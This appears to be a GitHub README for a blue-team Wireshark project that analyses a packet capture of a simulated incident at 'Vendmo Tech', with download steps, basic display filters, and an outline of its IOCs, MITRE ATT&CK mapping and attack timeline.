# 🔎 VendmoTech_Network_Traffic_Analysis - Spot Threats in Network Traffic

[![Download / Open Project](https://img.shields.io/badge/Download%20Project-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/gabrielliaprotecting43/VendmoTech_Network_Traffic_Analysis)

## 🧭 Project Overview

VendmoTech_Network_Traffic_Analysis is a Wireshark-based network traffic review built around a live SOC incident at Vendmo Tech. It helps you inspect network activity, spot signs of a real attack, and follow the flow of the event from start to finish.

This project focuses on:

- C2 beaconing
- Data exfiltration
- Port scanning
- IOC review
- MITRE ATT&CK mapping
- Attack timeline analysis

It is set up as a Blue Team and SOC portfolio project. The goal is to help you understand what happened in the network, what the attacker touched, and what signs point to each stage of the incident.

## 📥 Download and Open the Project

Use this link to visit the project page and download or open the files:

https://github.com/gabrielliaprotecting43/VendmoTech_Network_Traffic_Analysis

If your browser shows the GitHub page, use the green Code button on that page, then choose Download ZIP. After the download finishes, extract the ZIP file to a folder you can find again.

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows computer
- Wireshark installed
- A file unzip tool, such as the built-in Windows extractor
- Enough free disk space for a 2.3 GB PCAP file
- A screen that can show large packet lists without scaling issues

Recommended setup:

- Windows 10 or Windows 11
- 8 GB RAM or more
- A modern CPU
- At least 5 GB of free space

If Wireshark is not installed yet, install it first, then open the PCAP file from this project.

## 🚀 Getting Started

Follow these steps on Windows:

1. Open the project link above.
2. Download the repository as a ZIP file.
3. Save the ZIP file to your Downloads folder.
4. Right-click the ZIP file and choose Extract All.
5. Open the extracted folder.
6. Find the PCAP file and any notes, reports, or supporting files.
7. Install Wireshark if needed.
8. Open Wireshark.
9. Use File > Open and select the PCAP file.
10. Wait for the capture to load. Large files can take a while.
11. Use the packet list, packet details, and packet bytes panes to review traffic.
12. Follow the timeline and findings in the project files as you inspect the traffic.

## 🪟 How to Run on Windows

This project does not need a command line setup. You run it by opening the packet capture in Wireshark.

### Steps

1. Download the project from GitHub.
2. Extract the files.
3. Open Wireshark.
4. Open the PCAP file.
5. Let Wireshark finish loading the capture.
6. Use the search and filter tools to inspect traffic patterns.

### Helpful Wireshark actions

- Filter traffic by IP address
- Filter by domain name
- Filter by TCP port
- Review packet time gaps
- Follow TCP streams
- Check DNS lookups
- Inspect HTTP and HTTPS sessions

## 🔍 What You Will Find

This analysis includes a full look at a simulated incident. You can use it to study how an attacker moves through a network and how a defender spots it.

Expected findings include:

- C2 beaconing patterns with repeat traffic
- Signs of data leaving the network
- Port scans against multiple hosts or ports
- Suspicious connections that stand out from normal traffic
- DNS activity that helps reveal hostnames and endpoints
- Packet patterns that match known attack stages

## 🧩 Included Analysis Content

This repository includes material that supports a full incident review:

- 8 findings tied to the incident
- 10 indicators of compromise
- MITRE ATT&CK v14 mapping
- Attack timeline
- Network forensics notes
- Blue Team style review points
- SOC analyst reference material

## 🧠 How to Read the Capture

If you are new to packet analysis, use this simple order:

1. Start with the attack timeline.
2. Look for unusual bursts of traffic.
3. Check for repeat connections to the same address.
4. Review DNS traffic for strange hostnames.
5. Look for large uploads or repeated outbound sessions.
6. Check for scans across many ports or hosts.
7. Match what you see to the listed IOCs.
8. Use the MITRE mapping to place each event in the attack flow.

## 🛠️ Common Wireshark Filters

These filters can help you explore the capture:

- `ip.addr == x.x.x.x` — show traffic for one host
- `tcp.port == 80` — show HTTP traffic
- `udp.port == 53` — show DNS traffic
- `http` — show HTTP packets
- `dns` — show DNS packets
- `tcp.flags.syn == 1 and tcp.flags.ack == 0` — help spot scan activity
- `frame contains "beacon"` — search for known text in packets

Use the project notes to connect the filter results with the incident story.

## 🧾 Indicators of Compromise

The repository centers on 10 IOCs that help identify the attack. These may include:

- Suspicious IP addresses
- Strange domain names
- Repeated request intervals
- Unexpected file transfer signs
- Unusual user agent strings
- Known bad ports
- Hostnames tied to attacker control
- Small, regular packets that suggest beaconing
- Large outbound transfers
- Scan-like connection patterns

## 🗺️ MITRE ATT&CK Mapping

The analysis maps activity to MITRE ATT&CK v14 so you can see which tactics and techniques fit each stage of the event.

Common stages covered here:

- Reconnaissance
- Initial access
- Command and control
- Exfiltration
- Discovery
- Scanning

This helps you connect packet evidence to attacker behavior in a clean way.

## 📂 Project Focus Areas

This repository is useful for:

- Blue Team practice
- SOC interview prep
- Packet capture review
- Threat hunting practice
- Incident response study
- Network forensics learning
- Wireshark hands-on work

## 🪄 File and Folder Use

After you extract the ZIP file, look for files such as:

- The PCAP file
- A findings document
- An IOC list
- A timeline file
- A report or notes folder
- Supporting screenshots or reference files

Open the text or document files first if you want context, then open the PCAP in Wireshark.

## 🔐 Safe Use on Windows

Use a local copy of the files on your own computer. Keep the PCAP on a drive with enough space. If Wireshark asks to update the file view for a large capture, let it finish before you apply filters.

## 🧰 Simple Troubleshooting

If you have trouble opening the project:

- Make sure the ZIP file finished downloading
- Check that the file was extracted
- Confirm Wireshark is installed
- Try opening the PCAP again from inside Wireshark
- Close other large apps if the file loads slowly
- Move the project folder to a local drive if it is on a network share

If the capture takes time to open, wait for the load to finish before using filters.

## 📈 Why This Project Matters

This project gives you a realistic view of how network attacks look in packet data. You can see how small signs, like repeat traffic or scan patterns, can reveal a larger incident. It also shows how SOC work depends on packet review, IOC tracking, and clear incident notes.

## 🏷️ Topics

blue-team, c2-detection, cybersecurity, data-exfiltration, fintech, incident-response, ioc, mitre-attack, network-forensics, network-security, packet-analysis, soc-analyst, threat-detection, wireshark